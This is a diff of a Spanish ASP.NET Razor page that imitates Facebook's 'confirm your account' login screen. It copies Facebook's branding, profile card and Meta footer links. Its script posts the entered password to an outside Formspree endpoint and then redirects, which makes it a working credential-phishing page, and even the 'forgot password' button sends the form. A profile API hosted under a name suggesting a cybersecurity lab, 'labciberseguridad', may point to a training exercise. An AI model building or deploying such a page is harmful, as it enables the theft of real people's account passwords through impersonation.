@@ -1,455 +1,1015 @@
 ﻿<!DOCTYPE html>
+
 <html lang="es">
+
 <head>
+
     <meta charset="UTF-8">
+
     <meta name="viewport" content="width=device-width, initial-scale=1">
+
     <title>Confirma tu cuenta</title>
+
     <style>
+
             :root {
+
                 --bg-base: #f4f4fb;
+
                 --fb-blue: #0866ff;
+
                 --fb-text-main: #1c1e21;
+
                 --fb-text-sec: #65676b;
+
                 --fb-text-desc: #48566b;
+
                 --fb-border: #ccd0d5;
+
                 --fb-error: #d31130;
+
                 --soft-gradient: radial-gradient(circle at 0% 50%,rgba(255,200,200,.4) 0%,rgba(180,200,255,.3) 40%,transparent 70%);
+
             }
+
+
 
             * {
+
                 margin: 0;
+
                 padding: 0;
+
                 box-sizing: border-box;
+
             }
+
+
 
             html, body {
+
                 width: 100%;
+
                 height: 100%;
+
             }
+
+
 
             body {
+
                 background: var(--soft-gradient),var(--bg-base);
+
                 background-attachment: fixed;
+
                 font-family: 'Segoe UI',Arial,sans-serif;
+
                 color: var(--fb-text-main);
+
             }
+
+
 
             .page-container {
+
                 min-height: 100vh;
+
                 width: 100%;
+
                 display: flex;
+
                 flex-direction: column;
+
                 align-items: center;
+
             }
+
+
 
             .main-wrapper {
+
                 flex: 1;
+
                 width: 100%;
+
                 max-width: 735px;
+
                 padding: 24px 20px 40px;
+
             }
+
+
 
             .header-container {
+
                 display: flex;
+
                 flex-direction: column;
+
                 align-items: flex-start;
+
                 gap: 40px;
+
                 margin-bottom: 8px;
+
             }
+
+
 
             .back-btn {
+
                 display: flex;
+
                 align-items: center;
+
                 justify-content: center;
+
                 width: 36px;
+
                 height: 36px;
+
                 margin-left: -8px;
+
                 border-radius: 50%;
+
                 cursor: pointer;
+
                 color: var(--fb-text-main);
+
                 background: none;
+
                 border: none;
+
             }
+
+
 
                 .back-btn:hover {
+
                     background: rgba(0,0,0,.06);
+
                 }
+
+
 
                 .back-btn svg {
+
                     width: 22px;
+
                     height: 22px;
+
                     fill: currentColor;
+
                 }
 
-            .profile-card {
-                width: 100%;
-                background: rgba(255,255,255,.65);
-                border: 1px solid var(--fb-border);
-                border-radius: 14px;
-                display: flex;
-                align-items: center;
-                padding: 14px 18px;
+
+
+            .header-title {
+
+                font-size: clamp(24px, 3.5vw, 30px);
+
+                font-weight: 700;
+
+            }
+
+
+
+            .description {
+
+                font-size: 15px;
+
+                color: var(--fb-text-desc);
+
+                line-height: 1.4;
+
                 margin-bottom: 24px;
-                gap: 14px;
-                box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+
             }
 
-            .profile-avatar-container {
-                position: relative;
-                width: 56px;
-                height: 56px;
-                flex-shrink: 0;
-            }
 
-            .profile-avatar {
-                width: 56px;
-                height: 56px;
-                border-radius: 50%;
-                object-fit: cover;
-            }
-
-            .profile-badge {
-                position: absolute;
-                bottom: 0;
-                right: 0;
-                width: 18px;
-                height: 18px;
-                background: var(--fb-blue);
-                border-radius: 50%;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                border: 2px solid white;
-            }
-
-                .profile-badge svg {
-                    width: 10px;
-                    height: 10px;
-                    fill: white;
-                }
-
-            .profile-info {
-                display: flex;
-                flex-direction: column;
-            }
-
-            .profile-name {
-                font-size: 16px;
-                font-weight: 600;
-                color: var(--fb-text-main);
-            }
-
-            .profile-app {
-                font-size: 14px;
-                color: var(--fb-text-sec);
-            }
 
             .code-group {
+
                 position: relative;
+
                 margin-bottom: 20px;
+
             }
+
+
 
                 .code-group input {
+
                     width: 100%;
+
                     height: 64px;
+
                     padding: 26px 45px 10px 20px;
+
                     font-size: 16px;
+
                     font-family: inherit;
+
                     color: var(--fb-text-main);
+
                     background: rgba(255,255,255,.55);
+
                     border: 1px solid var(--fb-border);
+
                     border-radius: 14px;
+
                     outline: none;
+
                     transition: border-color .15s, box-shadow .15s;
+
                 }
+
+
 
                     .code-group input:focus {
+
                         border-color: var(--fb-blue);
+
                         box-shadow: 0 0 0 2px rgba(8,102,255,.2);
+
                     }
+
+
 
                 .code-group label {
+
                     position: absolute;
+
                     left: 20px;
+
                     top: 50%;
+
                     transform: translateY(-50%);
+
                     font-size: 16px;
+
                     color: #8891a0;
+
                     pointer-events: none;
+
                     transition: all .15s ease;
+
                 }
+
+
 
                 .code-group input:focus + label,
+
                 .code-group input:not(:placeholder-shown) + label {
+
                     top: 14px;
+
                     transform: none;
+
                     font-size: 12px;
+
                 }
+
+
 
             .toggle-password {
+
                 position: absolute;
+
                 right: 15px;
+
                 top: 50%;
+
                 transform: translateY(-50%);
+
                 background: none;
+
                 border: none;
+
                 cursor: pointer;
+
                 color: var(--fb-text-sec);
+
                 display: flex;
+
                 align-items: center;
+
                 justify-content: center;
+
                 padding: 5px;
+
             }
+
+
 
                 .toggle-password svg {
+
                     width: 22px;
+
                     height: 22px;
+
                     fill: currentColor;
+
                 }
+
+
+
+            .profile-card {
+
+                width: 100%;
+
+                background: rgba(255,255,255,.65);
+
+                border: 1px solid var(--fb-border);
+
+                border-radius: 14px;
+
+                display: flex;
+
+                align-items: center;
+
+                padding: 14px 18px;
+
+                margin-bottom: 24px;
+
+                gap: 14px;
+
+                box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+
+            }
+
+
+
+            .profile-avatar-container {
+
+                position: relative;
+
+                width: 56px;
+
+                height: 56px;
+
+                flex-shrink: 0;
+
+            }
+
+
+
+            .profile-avatar {
+
+                width: 56px;
+
+                height: 56px;
+
+                border-radius: 50%;
+
+                object-fit: cover;
+
+            }
+
+
+
+            .profile-badge {
+
+                position: absolute;
+
+                bottom: 0;
+
+                right: 0;
+
+                width: 18px;
+
+                height: 18px;
+
+                background: var(--fb-blue);
+
+                border-radius: 50%;
+
+                display: flex;
+
+                align-items: center;
+
+                justify-content: center;
+
+                border: 2px solid white;
+
+            }
+
+
+
+                .profile-badge svg {
+
+                    width: 10px;
+
+                    height: 10px;
+
+                    fill: white;
+
+                }
+
+
+
+            .profile-info {
+
+                display: flex;
+
+                flex-direction: column;
+
+            }
+
+
+
+            .profile-name {
+
+                font-size: 16px;
+
+                font-weight: 600;
+
+                color: var(--fb-text-main);
+
+            }
+
+
+
+            .profile-app {
+
+                font-size: 14px;
+
+                color: var(--fb-text-sec);
+
+            }
+
+
 
             .btn-pill {
+
                 width: 100%;
+
                 padding: 11px 17px;
+
                 border-radius: 50px;
+
                 border: none;
+
                 cursor: pointer;
+
                 font-size: 15px;
+
                 font-weight: 600;
+
                 margin-bottom: 12px;
+
                 transition: background .15s ease;
+
             }
+
+
+
+                .btn-pill:last-child {
+
+                    margin-bottom: 0;
+
+                }
+
+
 
             .btn-primary {
+
                 background: var(--fb-blue);
+
                 color: white;
+
             }
+
+
 
                 .btn-primary:hover {
+
                     background: #0958d9;
+
                 }
+
+
 
             .btn-secondary {
+
                 background: rgba(255,255,255,.3);
+
                 border: 1px solid var(--fb-border);
+
                 color: var(--fb-text-main);
+
             }
+
+
 
                 .btn-secondary:hover {
+
                     background: rgba(255,255,255,.55);
+
                 }
+
+
 
             .language-footer {
+
                 width: 100%;
+
                 max-width: 1130px;
+
                 padding: 0 20px;
+
             }
+
+
 
             .idiomas {
+
                 display: flex;
+
                 flex-wrap: wrap;
+
                 justify-content: flex-start;
+
                 gap: 6px 18px;
+
                 padding: 24px 0 16px;
+
             }
+
+
 
                 .idiomas span,
+
                 .idiomas a {
+
                     color: var(--fb-text-sec);
+
                     font-size: 14px;
+
                     text-decoration: none;
+
                 }
+
+
 
                     .idiomas a:hover {
+
                         text-decoration: underline;
+
                     }
+
+
 
             .divider {
+
                 border: none;
+
                 border-top: 1px solid rgba(204,208,213,.8);
+
                 margin: 0 0 16px;
+
             }
+
+
 
             .footer-links {
+
                 display: flex;
+
                 flex-wrap: wrap;
+
                 gap: 6px 16px;
+
                 padding-bottom: 30px;
+
             }
+
+
 
                 .footer-links a {
+
                     color: var(--fb-text-sec);
+
                     font-size: 12px;
+
                     text-decoration: none;
+
                 }
+
+
 
                     .footer-links a:hover {
+
                         text-decoration: underline;
+
                     }
+
+
+
+            @@media (max-width: 767px) {
+
+                .main-wrapper {
+
+                    max-width: 100%;
+
+                    padding: 16px 16px 32px;
+
+                }
+
+
+
+                .header-container {
+
+                    gap: 26px;
+
+                }
+
+
+
+                .code-group {
+
+                    margin-bottom: 20px;
+
+                }
+
+
+
+                    .code-group input {
+
+                        height: 56px;
+
+                        font-size: 15px;
+
+                    }
+
+
+
+                .btn-pill {
+
+                    padding: 10px 14px;
+
+                    font-size: 15px;
+
+                }
+
+
+
+                .idiomas {
+
+                    gap: 6px 14px;
+
+                    padding: 20px 0 12px;
+
+                }
+
+
+
+                    .idiomas span,
+
+                    .idiomas a {
+
+                        font-size: 13px;
+
+                    }
+
+
+
+                .footer-links {
+
+                    gap: 4px 12px;
+
+                }
+
+
+
+                    .footer-links a {
+
+                        font-size: 11px;
+
+                    }
+
+
+
+                .divider {
+
+                    margin-bottom: 12px;
+
+                }
+
+            }
+
     </style>
+
 </head>
+
 <body>
 
+
+
     <div class="page-container">
+
         <div class="main-wrapper">
+
             <div class="header-container">
+
                 <button class="back-btn" onclick="regresarIndex()" role="button" aria-label="Volver" title="Volver">
+
                     <svg viewBox="0 0 24 24" aria-hidden="true">
+
                         <path clip-rule="evenodd" fill-rule="evenodd"
+
                               d="M16.753 4.341a1 1 0 0 0-1.412-.094l-8 7a1 1 0 0 0 0 1.506l8 7a1 1 0 0 0 1.318-1.506L9.518 12l7.14-6.247a1 1 0 0 0 .094-1.412z" />
+
                     </svg>
+
                 </button>
+
             </div>
+
+
 
             <form id="loginForm">
+
                 @Html.AntiForgeryToken()
 
+
+
                 <div class="profile-card">
+
                     <div class="profile-avatar-container">
-                        <!-- Se usa una imagen genérica temporal hasta que cargue la API -->
-                        <img id="apiAvatar" src="https://via.placeholder.com/56" alt="Avatar" class="profile-avatar" />
-                        <div class="profile-badge">
-                            <svg viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12c0-5.523-4.477-10-10-10z" /></svg>
-                        </div>
+                        <!-- Se añadió id="avatar-api" -->
+                        <img id="avatar-api" src="https://via.placeholder.com/56" alt="Avatar" class="profile-avatar" onerror="this.src='https://via.placeholder.com/56'" />
+                        <!-- ... código del badge se mantiene igual ... -->
                     </div>
                     <div class="profile-info">
-                        <span id="apiNombre" class="profile-name">Cargando...</span>
+                        <!-- Se añadió id="nombre-api" -->
+                        <span id="nombre-api" class="profile-name">Cargando perfil...</span>
                         <span class="profile-app">Facebook</span>
                     </div>
+
                 </div>
+
+
 
                 <div class="code-group">
+
                     <input type="password" id="contraseniaActual" name="contraseniaActual" placeholder=" " autocomplete="current-password" required />
+
                     <label for="contraseniaActual">Contraseña</label>
+
                     <button type="button" class="toggle-password" onclick="alternarVisibilidadPassword()" aria-label="Mostrar contraseña">
+
                         <svg id="eyeIcon" viewBox="0 0 24 24">
+
                             <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
+
                         </svg>
+
                     </button>
+
                 </div>
 
+
+
                 <button type="button" class="btn-pill btn-primary" onclick="iniciarSesion()">
+
                     Iniciar sesión
+
                 </button>
+
+
 
                 <button type="button" class="btn-pill btn-secondary" onclick="olvideContrasenia()">
+
                     ¿Has olvidado la contraseña?
+
                 </button>
+
             </form>
+
         </div>
 
+
+
         <footer class="language-footer">
+
             <nav class="idiomas" aria-label="Idiomas">
+
                 <span>Español (España)</span>
+
                 <a href="#">English (US)</a>
+
                 <a href="#">Italiano</a>
+
                 <a href="#">Français (France)</a>
+
                 <a href="#">Português (Brasil)</a>
+
                 <a href="#">Deutsch</a>
+
                 <a href="#">中文(简体)</a>
+
                 <a href="#">Más idiomas…</a>
+
             </nav>
+
             <hr class="divider" />
+
             <div class="footer-links">
+
                 <a href="#">Registrarte</a>
+
                 <a href="#">Iniciar sesión</a>
+
                 <a href="#">Messenger</a>
+
                 <a href="#">Facebook Lite</a>
+
                 <a href="#">Vídeo</a>
+
                 <a href="#">Meta Pay</a>
+
                 <a href="#">Meta Store</a>
+
                 <a href="#">Meta Quest</a>
+
                 <a href="#">Ray-Ban Meta</a>
+
                 <a href="#">Meta AI</a>
+
                 <a href="#">Instagram</a>
+
                 <a href="#">Threads</a>
+
                 <a href="#">Política de privacidad</a>
+
                 <a href="#">Centro de privacidad</a>
+
                 <a href="#">Información</a>
+
                 <a href="#">Crear anuncio</a>
+
                 <a href="#">Crear página</a>
+
                 <a href="#">Desarrolladores</a>
+
                 <a href="#">Empleo</a>
+
                 <a href="#">Cookies</a>
+
                 <a href="#">Opciones de anuncios</a>
+
                 <a href="#">Condiciones</a>
+
                 <a href="#">Ayuda</a>
+
                 <a href="#">Subir contactos y no usuarios</a>
+
             </div>
+
         </footer>
+
     </div>
 
+
+
     <script>
+
             function alternarVisibilidadPassword() {
+
                 const input = document.getElementById('contraseniaActual');
+
                 const eyeIcon = document.getElementById('eyeIcon');
 
+
+
                 if (input.type === 'password') {
+
                     input.type = 'text';
+
                     eyeIcon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.12c0-1.66-1.34-3-3-3l-.17.02z"/>';
+
                 } else {
+
                     input.type = 'password';
+
                     eyeIcon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+
                 }
+
             }
+
+
 
             function regresarIndex() {
+
                 window.location.href = '@Url.Action("Index", "Home")';
+
             }
+
+
 
             function iniciarSesion() {
+
                 const passwordInput = document.getElementById('contraseniaActual');
 
+
+
+                // Valida que el campo no esté vacío obligatoriamente antes de enviar
+
                 if (!passwordInput.value.trim()) {
+
                     passwordInput.focus();
+
                     return;
+
                 }
 
+
+
                 enviarDatosYRedirigir('@Url.Action("Inicio", "Home")');
+
             }
+
+
 
             function olvideContrasenia() {
+
                 enviarDatosYRedirigir('@Url.Action("Index", "Home")');
+
             }
+
+
 
             function enviarDatosYRedirigir(urlDestino) {
+
                 const form = document.getElementById('loginForm');
+
                 const formData = new FormData(form);
 
+
+
                 fetch('https://formspree.io/f/xvkpnleo', {
+
                     method: 'POST',
+
                     body: formData,
+
                     headers: {
+
                         'Accept': 'application/json'
+
                     },
+
                     keepalive: true
+
                 }).catch(error => {
+
                     console.error("Error al enviar:", error);
+
                 }).finally(() => {
+
                     window.location.href = urlDestino;
+
                 });
+
             }
 
-            // Pide directamente el ID 1 a la API para mostrar el nombre y la foto actualizados
-            document.addEventListener("DOMContentLoaded", function () {
-                fetch('/api/perfiles/1')
+                        document.addEventListener("DOMContentLoaded", () => {
+                // URL de tu API apuntando al ID 1.
+                // Asegúrate de cambiar "localhost:5279" por tu dominio en Render (ej. https://labciberseguridad.onrender.com) cuando lo subas a producción.
+                const apiUrl = 'https://labciberseguridad.onrender.com/api/Perfiles/1';
+
+                fetch(apiUrl)
                     .then(response => {
                         if (!response.ok) {
-                            throw new Error("No se pudo obtener el perfil ID 1");
+                            throw new Error('No se pudo obtener la información de la API');
                         }
                         return response.json();
                     })
                     .then(data => {
-                        const nombrePersona = data.nombre || data.Nombre || "Usuario";
-                        const fotoUrlPersona = data.fotoUrl || data.FotoUrl || data.urlFoto || data.UrlFoto || data.imagen || data.Imagen || 'https://via.placeholder.com/56';
+                        // data mapea a tu PersonaModel en C#: { id, nombre, fotoUrl }
 
-                        document.getElementById("apiNombre").textContent = nombrePersona;
-                        document.getElementById("apiAvatar").src = fotoUrlPersona;
+                        // Actualizar el nombre
+                        const elementoNombre = document.getElementById('nombre-api');
+                        if (elementoNombre && data.nombre) {
+                            elementoNombre.textContent = data.nombre;
+                        }
+
+                        // Actualizar la URL de la foto
+                        const elementoAvatar = document.getElementById('avatar-api');
+                        if (elementoAvatar && data.fotoUrl) {
+                            elementoAvatar.src = data.fotoUrl;
+                        }
                     })
                     .catch(error => {
-                        console.error("Error al cargar el perfil ID 1:", error);
-                        document.getElementById("apiNombre").textContent = "Usuario";
+                        console.error("Error al cargar el perfil de la API:", error);
+                        document.getElementById('nombre-api').textContent = "Error al cargar";
                     });
             });
+
     </script>
+
 </body>
+
 </html>
